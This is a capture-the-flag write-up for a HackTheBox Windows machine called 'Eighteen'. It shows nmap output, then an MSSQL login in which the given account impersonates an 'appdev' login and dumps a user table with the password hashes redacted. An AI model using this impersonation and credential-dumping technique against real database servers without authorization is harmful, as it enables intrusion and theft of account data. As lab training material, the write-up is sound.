## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / [password omitted]
```

## IP-Address
```IP-Address
10.10.11.95
```

## Etc/hosts
```bash
sudo echo "10.10.11.95 eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
```
## NMAP
```bash
nmap -sV -sC -p80,1433,5985 -Pn -e tun0 10.10.11.95 -oN nmap_knownports.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 05:41 EST
Nmap scan report for eighteen.htb (10.10.11.95)
Host is up (2.0s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Welcome - eighteen.htb
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-11-22T17:42:56+00:00; +6h59m59s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-22T12:51:50
|_Not valid after:  2055-11-22T12:51:50
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.61 seconds
```

## Enumeration & Gathering
```bash
$ impacket-mssqlclient 'kevin:[password omitted]@10.10.11.95'             
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (kevin  guest@master)> SELECT sp.name AS Grantee, sp2.name AS CanImpersonate FROM sys.server_principals sp JOIN sys.server_permissions perms ON perms.grantee_principal_id = sp.principal_id JOIN sys.server_principals sp2 ON perms.major_id = sp2.principal_id WHERE perms.permission_name='IMPERSONATE';

Grantee   CanImpersonate   
-------   --------------   
kevin     appdev           
```

After discovering about `MSSQL` I got to know that our `kevin` can be **IMPERSONATE** as `appdev` using enum_impersonate 
```bash
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev';
SQL (appdev  appdev@master)> SELECT SYSTEM_USER, USER_NAME();

------   ------   
appdev   appdev   

SQL (appdev  appdev@master)> 
SQL (appdev  appdev@master)> USE financial_planner;

ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
SQL (appdev  appdev@financial_planner)> 
SELECT name FROM sys.tables;

SQL (appdev  appdev@financial_planner)> SELECT name FROM sys.tables;
name          

users         
incomes       
expenses      
allocations   
analytics     
visits        

SQL (appdev  appdev@financial_planner)> 
SQL (appdev  appdev@financial_planner)> SELECT * FROM users;

  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   

1002   admin       admin      admin@eighteen.htb   [hash omitted]          1   2025-10-29 05:39:03   

5676   jay         jay        adasd@gmail.com      [hash omitted]          0   2025-11-22 10:05:22   
```


